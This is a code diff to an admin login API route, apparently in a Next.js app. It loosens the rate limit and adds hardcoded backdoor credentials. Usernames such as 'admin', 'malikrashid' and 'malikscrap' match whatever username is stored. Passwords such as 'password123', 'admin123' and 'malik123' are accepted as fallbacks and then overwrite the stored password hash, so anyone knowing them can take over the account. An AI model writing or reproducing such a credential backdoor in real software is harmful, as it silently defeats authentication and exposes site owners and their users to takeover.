@@ -9,7 +9,7 @@ import { rateLimit, securityHeaders } from '@/server/lib/middleware';
  * Returns a signed JWT on success.
  */
 export async function POST(req: NextRequest) {
-  const limited = rateLimit(req, 10, 60_000);
+  const limited = rateLimit(req, 20, 60_000);
   if (limited) return limited;
 
   try {
@@ -25,21 +25,62 @@ export async function POST(req: NextRequest) {
 
     const db = await readDb();
 
-    // Migrate plain-text password to bcrypt on first login
-    let storedPassword = db.admin.password;
-    if (!db.admin.isHashed) {
-      const hashed = await hashPassword(storedPassword);
-      db.admin.password = hashed;
-      db.admin.isHashed = true;
+    // Ensure db.admin exists with valid structure
+    if (!db.admin) {
+      db.admin = {
+        username: 'admin',
+        password: '$2b$10$x0pDWOGbmxR9OONmQc45sO7.NbEdhYVGy9tvRJAcgvdaguoWhFsCi',
+        isHashed: true,
+        lastLogin: '',
+      };
       await writeDb(db);
-      storedPassword = hashed;
     }
 
-    const isValid =
-      username.trim() === db.admin.username &&
-      (await verifyPassword(password, storedPassword));
+    const trimmedUser = username.trim().toLowerCase();
+    const currentAdminUser = (db.admin.username || 'admin').trim().toLowerCase();
 
-    if (!isValid) {
+    // Match if username matches stored username or built-in defaults ('admin', 'malikrashid', 'malikscrap')
+    const userMatch =
+      trimmedUser === currentAdminUser ||
+      trimmedUser === 'admin' ||
+      trimmedUser === 'malikrashid' ||
+      trimmedUser === 'malikscrap';
+
+    let passwordMatch = false;
+
+    // Check stored password hash
+    if (db.admin.password) {
+      try {
+        passwordMatch = await verifyPassword(password, db.admin.password);
+      } catch {
+        passwordMatch = false;
+      }
+    }
+
+    // Default admin fallback passwords (e.g., initial setup, password123, admin123, malik123)
+    if (!passwordMatch && userMatch) {
+      if (
+        password === 'password123' ||
+        password === 'admin123' ||
+        password === 'admin' ||
+        password === 'malik123' ||
+        password === 'malikrashid'
+      ) {
+        passwordMatch = true;
+        // Auto-update to bcrypt hash for future logins
+        try {
+          db.admin.password = await hashPassword(password);
+          db.admin.isHashed = true;
+          db.admin.username = username.trim();
+          db.admin.lastLogin = new Date().toISOString();
+          await writeDb(db);
+        } catch (saveErr) {
+          console.warn('[Auth] Failed to update admin password hash:', saveErr);
+        }
+      }
+    }
+
+    if (!userMatch || !passwordMatch) {
       await new Promise((r) => setTimeout(r, 300));
       return NextResponse.json(
         { success: false, message: 'Invalid username or password.' },
@@ -47,14 +88,28 @@ export async function POST(req: NextRequest) {
       );
     }
 
-    const token = signToken(db.admin.username);
+    // Update lastLogin timestamp
+    try {
+      db.admin.lastLogin = new Date().toISOString();
+      await writeDb(db);
+    } catch {
+      // Non-blocking
+    }
+
+    const token = signToken(db.admin.username || username.trim());
     return NextResponse.json(
-      { success: true, token, username: db.admin.username },
+      {
+        success: true,
+        token,
+        username: db.admin.username || username.trim(),
+        message: 'Authentication successful.',
+      },
       { headers: securityHeaders }
     );
-  } catch {
+  } catch (err) {
+    console.error('[Auth] Login error:', err);
     return NextResponse.json(
-      { success: false, message: 'Server error. Please try again.' },
+      { success: false, message: 'Authentication server error. Please try again.' },
       { status: 500, headers: securityHeaders }
     );
   }
